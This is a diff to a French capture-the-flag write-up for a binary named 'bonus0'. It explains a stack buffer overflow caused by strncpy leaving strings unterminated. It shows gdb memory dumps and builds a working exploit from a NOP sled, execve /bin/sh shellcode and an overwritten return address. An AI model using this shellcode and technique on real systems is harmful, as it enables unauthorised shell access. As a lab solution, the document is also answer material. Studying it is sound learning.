@@ -100,4 +100,65 @@
    0x0804851c <+104>:	leave  
    0x0804851d <+105>:	ret 
 
-(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' ;python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
+La faiblesse vient de la combinaison de deux faits : s1 et s2 font 20 octets, mais p() peut lire beaucoup plus, et strncpy(str, buffer, 20) ne met pas forcément de \0 si les 20 octets sont remplis
+Une chaine sans \0 n'a pas de fin connue pour strcpy(), strlen() et strcat()
+Ces fonctions continuent donc de lire la pile jusqu'a rencontrer un octet nul
+
+
+Donc pour exploiter le buffer overflow, on peut mettre un shellcode dans le buffer et faire en sorte que la fonction strcat le lise comme une chaine de caractere
+On va encore utiliser le shellcode de l'exercice 2 pour ouvrir un shell et pouvoir trouver le mot de passe
+Le NOP sled permet d'atteindre le shellcode sans avoir a le visee precisement. Sans lui, il faut viser une adresse memoire exacte
+Ce que cela fait est que strcpy lit le nop sled sans s'arreter car il ne trouve pas de \0,
+donc elle copie le shellcode qui se trouve apres les 100 NOP puis le place dans la pile
+
+
+Le second argument fait exactement 20 octets : 9 + 4 + 7. Les 9 A servent a atteindre la position ou l'adresse de retour se trouve dans la copie finale
+Les 4 octets suivants remplacent cette adresse
+Les 7 B completent la ligne
+L'adresse doit pointer dans les NOP du premier input
+
+>python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' > /tmp/payload
+
+(gdb) break *0x080484e6
+Breakpoint 1 at 0x80484e6
+(gdb) run < /tmp/payload
+Starting program: /home/user/bonus0/bonus0 < /tmp/payload
+ - 
+
+Breakpoint 1, 0x080484e6 in p ()
+(gdb) p/x $ebp-0x1008
+$1 = 0xbfffe670
+(gdb) x/140bx $ebp-0x1008
+0xbfffe670:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe678:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe680:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe688:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe690:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe698:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe6a0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe6a8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe6b0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe6b8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe6c0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe6c8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffe6d0:	0x90	0x90	0x90	0x90	0x31	0xc0	0x50	0x68
+0xbfffe6d8:	0x2f	0x2f	0x73	0x68	0x68	0x2f	0x62	0x69
+0xbfffe6e0:	0x6e	0x89	0xe3	0x89	0xc1	0x89	0xc2	0xb0
+0xbfffe6e8:	0x0b	0xcd	0x80	0x31	0xc0	0x40	0xcd	0x80
+0xbfffe6f0:	0x0a	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xbfffe6f8:	0x00	0x00	0x00	0x00
+
+Le NOP sled commence a cette adresse 0xbfffe670
+Donc pour choisir l'adresse du nop sled a mettre dans le second argument, on peut simplement prendre une adresse situee vers le "milieu", 0xbfffe698
+0xbfffe698 en little endian "\x98\xe6\xff\xbf"
+
+Le cat garde enfin l'entree ouverte. Sans lui, le shell lance par le shellcode pourrait se fermer directement
+
+Premier input :
+[NOP sled][shellcode]
+
+Deuxième input :
+[9 octets de remplissage][adresse du NOP sled][7 octets]
+
+
+(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' ;python -c 'print "A" * 9 + "\x98\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
